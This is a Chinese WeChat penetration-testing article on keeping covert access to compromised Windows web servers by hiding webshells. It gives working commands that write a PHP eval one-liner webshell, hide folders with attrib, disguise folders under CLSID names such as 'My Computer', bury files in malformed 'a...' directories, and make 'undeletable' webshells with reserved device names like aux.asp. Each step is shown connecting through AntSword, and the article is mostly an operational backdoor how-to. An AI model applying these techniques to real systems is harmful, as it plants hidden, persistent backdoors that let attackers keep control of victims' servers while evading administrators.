> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/788mROdIG0ncExDzBYcYow)

0x01 前言
-------

当我们进行渗透测试的过程中, 拿下来一台机器的权限, 如果对这台主机做一个长久的控制, 是我们要考虑的事情. 所以通过本篇文章, 我们旨在告诉大家, 在 Windows 系统下的一些权限维持的方法, 包括了 webshell 的维持和木马的可持续控制等等.

0x02 正文
-------

### 2.1 隐藏文件夹隐藏 Webshell

在我们进行渗透测试的过程中, 如果拿到了一台 Windows 主机的 Webshell, 可以通过创建隐藏文件的形式, 来将我们的 webshell 木马进行隐藏. **典型命令**如下:

```
attrib +s +a +h +r [目标文件夹]
```

这条命令的含义是将原本的文件夹添加了系统文件属性、存档文件属性、只读文件属性和**隐藏文件属性**

**案例演示**: 我们拿下了一台 Windows 主机的 webshell, 通过中国蚁剑我们连接上去, 成功进入虚拟终端. 在一句话木马的当前目录下创建新文件夹, 并写入新的木马, 继而将含有木马的文件夹进行隐藏. 命令如下:

```
mkdir tmp #创建隐藏文件夹,此时尚未隐藏
cd tmp #进入创建的文件夹
echo ^ <?php @eval(POST['cmd']); ?^> >>shell.php #写入Webshell至tmp目录下
cd ../ #返回上一级目录
attrib +s +a +h +r tmp #对创建的文件夹进行隐藏
```

此时受害者在自己的目录下是看不到我们创建的文件夹的 (**除非**开启显示隐藏文件 [**默认不开启**])

![](https://mmbiz.qpic.cn/mmbiz_png/ibxcwMR8shiaZmiaXD9Qia3iadofGFn7ATIiaqibQpqDicTDrphte45WaQ8pRol8JsDzGlYicBWNbR0ELDPH5koaqnA9Xfg/640?wx_fmt=png)

此时我们进行拼接, 连接上我们的 Webshell, 发现成功连接.

![](https://mmbiz.qpic.cn/mmbiz_png/ibxcwMR8shiaZmiaXD9Qia3iadofGFn7ATIiaqJjUE1KV0ZyiajLD1xuemHrtgEsIvQibZH9oISwA3dXr9n0F1Kn9PRiaqw/640?wx_fmt=png)

### 2.2 利用系统代号隐藏 Webshell

创建一个新建文件夹, 将木马放入这个文件夹, 重命名文件夹名称为 "Computer.{20D04FE0-3AEA-1069-A2D8-08002B30309D}", 此时会发现文件夹变成了我的电脑, 双击进入的也是正常的我的电脑的页面

![](https://mmbiz.qpic.cn/mmbiz_png/ibxcwMR8shiaZmiaXD9Qia3iadofGFn7ATIiaqgibYtzEdQ70cNaepp0vekQgWWQRIL0u8H3ucadWKhtpvcEmXmdVM7Ww/640?wx_fmt=png)

通过拼接文件夹名, 使用中国蚁剑进行木马连接, 例如

```
http://127.0.0.1/Computer.{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell.php
```

发现可以成功连接到 Webshell 里去.

![](https://mmbiz.qpic.cn/mmbiz_png/ibxcwMR8shiaZmiaXD9Qia3iadofGFn7ATIiaqvFXWffZeHonW5fYjgPlkgsfJuuTunFCp5SwbZewQQLzuPGHCUia1voA/640?wx_fmt=png)

**类似的可用的**特殊文件名的代号还有：

```
  我的电脑.{20D04FE0-3AEA-1069-A2D8-08002B30309D}
  回收站.{645ff040-5081-101b-9f08-00aa002f954e}
  拔号网络.{992CFFA0-F557-101A-88EC-00DD010CCC48}
  打印机.{2227a280-3aea-1069-a2de-08002b30309d}
  控制面板.{21ec2020-3aea-1069-a2dd-08002b30309d}
  网上邻居.{208D2C60-3AEA-1069-A2D7-08002B30309D}
```

### 2.3 畸形目录隐藏 Webshell

首先在终端里创建一个畸形目录, 命令如下

```
mkdir a...\
```

然后使用命令 Copy 命令将木马移动到畸形目录下, 注意一定是命令行里移动的.

```
copy b.asp C:\inetpub\wwwroot\a...\b.asp
```

此时访问进入 a... 文件夹下, 发现不存在 b.asp.

![](https://mmbiz.qpic.cn/mmbiz_png/ibxcwMR8shiaZmiaXD9Qia3iadofGFn7ATIiaqia7icTge0yMl3HicmJnRsUOiaPkpSFa2JpoPEyxVlY9J5lTjbloqxX5NvA/640?wx_fmt=png)

但是可以通过中国蚁剑连接上去

![](https://mmbiz.qpic.cn/mmbiz_png/ibxcwMR8shiaZmiaXD9Qia3iadofGFn7ATIiaqia9w8QACXGr8jYRCjr4xYYUfJeOVHviaiapJUZ0S8ynXu5dWvSYoulNRA/640?wx_fmt=png)

并且畸形目录无法被删除, 也就是说除非是专业人员, 此木马长久存在.

![](https://mmbiz.qpic.cn/mmbiz_png/ibxcwMR8shiaZmiaXD9Qia3iadofGFn7ATIiaq8BN3CYb7e8kic4bJ1nZZkq2YZ4SrYeJAhnP9fvbqwdbuEroelNeddPQ/640?wx_fmt=png)

删除方法：使用如下命令可删除畸形目录

```
rd /s /q [畸形文件夹]
```

### 2.4 利用系统保留名制作不死 Webshell

在 Windows 操作系统中, 是不能以下形式创建文件的, 比如 aux,com1,com2,prn,con,nul 等. 但是在 cmd 目录下可以通过 copy 语句创建, 这类文件无法在图形化界面被删除, 只能在命令行中被删除. 创建不死 Webshell 命令如下:

```
copy b.txt \\.\C:\inetpub\wwwroot\aux.asp
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibxcwMR8shiaZmiaXD9Qia3iadofGFn7ATIiaqvoDseYVRW83W0xUGJd1ut6ibonKicz4JicCP6vgBf18ozfr2po7S2c7Uw/640?wx_fmt=png)

但是通过中国蚁剑**可以正常连上**

![](https://mmbiz.qpic.cn/mmbiz_png/ibxcwMR8shiaZmiaXD9Qia3iadofGFn7ATIiaqQj1qVuofRWsrCXJOuuCGCa7x6fJ3UbKYQ3Huib2UEWVH03vYkA0iaztQ/640?wx_fmt=png)

0x03 总结
-------

本文总结了几种比较常见的 Webshell 隐藏方法，当然权限维持的方法并不局限于此，希望大家能够有所收获。

**声明：****该公众号大部分文章来自作者日常学习笔记，也有少部分文章是经过原作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。**

**请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。**

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)

**推荐阅读**

[**干货 | CS 绕过 vultr 特征检测修改算法**](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247486980&idx=1&sn=6d65ae57f03bd32fddb37d7055e5ac8e&chksm=c175f3abf6027abdad06009b2fe964e79f2ca60701ae806b451c18845c656c12b9948670dcbc&scene=21#wechat_redirect)

[**漏洞复现** **| GitLab 未授权 RCE(CVE-2021-22205)**](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247486834&idx=1&sn=a88a0afdbfbdf043e4210aa76dada233&chksm=c175f0ddf60279cb439452c995b0bf2371925babfc15f239b0f2c2f15d59205eb373f7947f78&scene=21#wechat_redirect)

[**漏洞复现 | 中科网威防火墙 (NPFW) 文件遍历漏洞**](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247486503&idx=1&sn=0f6f5d052798295e6c305f42b668abe2&chksm=c175f188f602789e4187f2fa1ee346bdd1a3d66c61721c2fa8bf7395b3d756f9fdee505a9f1c&scene=21#wechat_redirect)

  

  

点个在看 你最好看

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/ImtD1PjRzRibmwqBpXL6icIKqbwdwwR26NfB89hJ09AJCorfLHxNdGlIIKr02IiajJ3O6t3qzXFXcJZ1lUxUnibTIA/640?wx_fmt=png)